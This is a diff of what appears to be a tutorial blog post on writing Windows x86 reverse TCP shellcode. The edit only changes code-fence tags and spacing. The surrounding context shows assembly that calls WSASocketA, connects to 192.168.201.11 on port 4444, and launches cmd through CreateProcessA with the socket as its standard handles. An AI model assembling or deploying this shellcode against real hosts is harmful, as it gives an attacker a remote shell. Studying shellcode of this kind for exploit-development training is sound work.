@@ -458,7 +458,7 @@ Now, we <code  style="background-color: lightgrey; color:black;"><b>push edi</b>
 Now that we know the address of <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code> function, it is time to call and execute the function. Acording to Microsoft Docs, the function prototype of the <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code> is the following 
 </p>
 
-```C
+```c
 SOCKET WSAAPI WSASocketA(
   int                 af,
   int                 type,
@@ -517,7 +517,7 @@ This function creates a socket. The following arguments passed to the function
  The following assembly code implements the <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code> function 
 <br><br>
 
-```C
+```c
 ;call WSASocketA
 XOR ECX, ECX       ;zero out ECX register 
 PUSH EDX           ;null value for dwFlags                                    
@@ -549,7 +549,7 @@ At this point we are ready to search for the address of connect function.
 The following assembly code will be used in order to find the address of the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function 
 <br><br>
 
-```C
+```c
 ;; Find the address of connect 
 POP  EDI                             ;load previously saved ws2_32.dll address to ECX
 ADD  ESP, 0x10                       ;Align stack
@@ -578,7 +578,7 @@ Next, we implement the <code  style="background-color: lightgrey; color:black;">
 <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function prototype :
 <br><br>
 
-```C
+```c
 int WSAAPI connect(
   SOCKET         s,
   const sockaddr *name,
@@ -606,7 +606,7 @@ Function parameters :
 The following code implements the <code  style="background-color: lightgrey; color:black;"><b>connect</b></code> function  
 <br><br>
 
-```C
+```c
 ;call connect
 PUSH 0x0bc9a8c0          ;sin_addr set to 192.168.201.11
 PUSH word 0x5c11         ;port = 4444
@@ -637,7 +637,7 @@ At this point we will search for the address of <code  style="background-color: 
 The following assembly code will be used in order to find the address of the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function
 
 <br><br>
-```C
+```c
 ;; Find the address of CreateProcessA
 ADD  ESP,0x14                        ;Clean stack
 XOR  EBX, EBX                        ;zero out EBX
@@ -668,7 +668,7 @@ Next, the <code  style="background-color: lightgrey; color:black;"><b>CreateProc
 Following we can see the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function prototype 
 <br><br>
 
-```C
+```c
 
 BOOL CreateProcessA(
   LPCSTR                lpApplicationName,
@@ -736,21 +736,21 @@ Function parameters :
 <dd style=text-align:justify>
 The following code used to impement and call the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function 
 <br><br>
-```C
+```c
 PUSH 0x61646d63                      ;"admc"
 SUB  dword [ESP + 0x3], 0x61         ;"dmc" (remove "a")
 MOV  ECX, ESP                        ;ecx now points to "cmd" string
-
 ```
+
 At Lines 1-3 above, the instructions are setting the <code  style="background-color: lightgrey; color:black;"><b>ECX</b></code> register to point to <b>"cmd"</b> string. This is the <code  style="background-color: lightgrey; color:black;"><b>lpProcessInformation</b></code> argument of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code>, and provides the name of the module to be executed
 <br><br>
-```C
 
+```c
 XOR  EDX, EDX                        ;zero out EDX
 SUB  ESP, 16 
 MOV  EBX, ESP                        ;pointer for ProcessInfo
-
 ```
+
 As we see at the code above, at the first line we zero out the <code  style="background-color: lightgrey; color:black;"><b>EDX</b></code> register. At lines 2-3, we are setting the <code  style="background-color: lightgrey; color:black;"><b>EBX</b></code> register to point to <code  style="background-color: lightgrey; color:black;"><b>PROCESS_INFORMATION</b></code> structure.
 
 <br><br>
@@ -779,10 +779,11 @@ XOR  EAX, EAX                        ;zero out EAX
 ADD  AL, 44                          ;cb => 0x44 (size of struct)
 PUSH EAX                             ;eax points to STARTUPINFOA
 ```
+
 Later on, as we see at the code above, we continue setting up the <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure. At lines 1-3 above, we are setting up the standard input, the standard output and the standard error by putting the socket file descriptor into the struct members <code  style="background-color: lightgrey; color:black;"><b>hStdInput</b></code>, <code  style="background-color: lightgrey; color:black;"><b>hStdOutput</b></code>, and <code  style="background-color: lightgrey; color:black;"><b>hStdError</b></code>. At the fourth line above, the <code  style="background-color: lightgrey; color:black;"><b>cbReserved2</b></code> is reserved for use by the C run-time and must be zero. Same for <code  style="background-color: lightgrey; color:black;"><b>lpReserved2</b></code> at the fifth line. At lines 6-9, we are setting the <code  style="background-color: lightgrey; color:black;"><b>STARTF_USESTDHANDLES</b></code> struct member with the value <code  style="background-color: lightgrey; color:black;"><b>0x00000100</b></code>. Then, at lines 7-16, All the other values of <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure should be null. At seventeenth line, the <code  style="background-color: lightgrey; color:black;"><b>cb</b></code> member holds the size of the <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure which is <code  style="background-color: lightgrey; color:black;"><b>0x44</b></code> in hex. Then, at eighteenth line, the <code  style="background-color: lightgrey; color:black;"><b>EAX</b></code> register contains a pointer to <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> structure
 <br><br>
-```C
 
+```c
 ;;ProcessInfo struct
 MOV  EAX, ESP                        ;pStartupInfo
 PUSH EBX                             ;pProcessInfo
@@ -798,7 +799,6 @@ PUSH EDX                             ;pProcessAttributes => NULL
 PUSH ECX                             ;pCommandLine => pointer to "cmd"
 PUSH EDX                             ;ApplicationName => NULL
 CALL EBP                             ;execute CreateProcessA 
-
 ```
 
 At the code above, we are now starting the setup of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function. At lines 1-3 ,we are pushing the pointers of <code  style="background-color: lightgrey; color:black;"><b>STARTUPINFOA</b></code> and <code  style="background-color: lightgrey; color:black;"><b>PROCESS_INFORMATION</b></code> structures onto the stack as the two last arguments of the <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function. Afterwards, at lines 4-6 we are setting the next three arguments of <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function, the <code  style="background-color: lightgrey; color:black;"><b>CurrentDirectory</b></code>, and the <code  style="background-color: lightgrey; color:black;"><b>pEnvironment</b></code> with nulls, and the <code  style="background-color: lightgrey; color:black;"><b>CreationFlags</b></code> with zero. At lines 7-9 , we are setting the InheritHandles to <code  style="background-color: lightgrey; color:black;"><b>TRUE</b></code>, and that, because the <code  style="background-color: lightgrey; color:black;"><b>STARTF_USESTDHANDLES</b></code> was set before with <code  style="background-color: lightgrey; color:black;"><b>0x00000100</b></code>. Next, at lines 10-11, we are setting the <code  style="background-color: lightgrey; color:black;"><b>pThreadAttributes</b></code> and <code  style="background-color: lightgrey; color:black;"><b>pProcessAttributes</b></code> with null. At line 12, we set the pointer to <b>"cmd"</b>. At line 13 , we set the <code  style="background-color: lightgrey; color:black;"><b>ApplicationName</b></code> to null and then we call <code  style="background-color: lightgrey; color:black;"><b>CreateProcessA</b></code> function.
@@ -811,8 +811,7 @@ The following assembly code represents the code used to perform a reverse tcp so
 </dd>
 </dl>
 
-```C
-
+```c
 [BITS 32]
 
 global _start
